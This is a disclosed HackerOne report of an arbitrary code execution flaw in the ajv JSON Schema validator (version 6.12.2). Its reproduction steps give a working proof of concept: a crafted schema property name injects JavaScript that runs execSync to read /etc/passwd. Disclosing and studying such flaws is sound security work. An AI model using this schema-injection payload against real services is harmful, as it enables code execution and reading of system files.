# Arbitrary code execution via untrusted schemas in ajv

## Report Details
- **Report ID**: 897974
- **URL**: https://hackerone.com/reports/897974
- **State**: Closed
- **Severity**: low
- **Submitted**: 2020-06-14T13:42:42.772Z
- **Disclosed**: 2020-08-14T17:21:21.521Z

## Reporter
- **Username**: chalker
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report an arbitrary code execution vulnerability in `ajv`.
It allows to execute arbitrary code if an attacker-controlled schema is passed to the module.

I have confirmed that this should be treated as a security issue.
I labeled this as low because this is an unusual scenario, usually schemas are static.

# Module

**module name:** `ajv`
**version:** 6.12.2
**npm page:** `https://www.npmjs.com/package/ajv`

## Module Description

> The fastest JSON Schema validator for Node.js and browser. Supports draft-04/06/07.

## Module Stats

29 351 921 weekly downloads

# Vulnerability

## Vulnerability Description

ajv builds code in an unsafe way and applies regex transformations over it after data from a potentially untrusted JSON schema has been inserted in it, resulting in arbitrary code execution from an otherwise valid schema.

## Steps To Reproduce:

```js
const ajv = require('ajv')({})
const payload = "(console.log(process.mainModule.require(`child_process`).execSync(`cat /etc/passwd`).toString(`utf-8`)),process.exit(0))"
const schemaJSON =`
{
  "properties": {
    "){}}};${payload};return validate//": {
      "allOf": [{}]
    }
  }
}
`
ajv.compile(JSON.parse(schemaJSON))
```
Gist: https://gist.github.com/ChALkeR/a06ff0a76b3830205d3d4850068751f0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

## Impact

Executing arbitrary js code and/or shell commands if the schema is attacker-controlled (e.g. user supplies JSON with a schema).

## Attachments
No attachments
